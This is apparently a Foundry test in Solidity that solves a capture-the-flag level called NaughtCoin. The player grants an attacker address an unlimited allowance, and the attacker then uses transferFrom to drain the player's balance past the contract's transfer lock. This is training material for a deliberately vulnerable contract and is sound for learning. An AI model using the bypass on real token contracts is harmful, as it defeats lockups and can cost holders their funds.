//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/level16.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public naughtCoin;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);

        vm.startPrank(player);
        naughtCoin = new NaughtCoin(player);
        vm.stopPrank();
    }

    function test_attack() public {
        //we can use transferFrom function to transfer the tokens from player to attacker
        //player give the approval some limit and then attacker can transfer the tokens from player to attacker
        vm.startPrank(player);
        naughtCoin.approve(attacker, type(uint256).max);
        vm.stopPrank();
        vm.startPrank(attacker);
        uint256 fullbalance = naughtCoin.balanceOf(player);
        naughtCoin.transferFrom(player, attacker, fullbalance);
        assertEq(naughtCoin.balanceOf(attacker), fullbalance);
        assertEq(naughtCoin.balanceOf(player), 0);
        vm.stopPrank();
    }
}
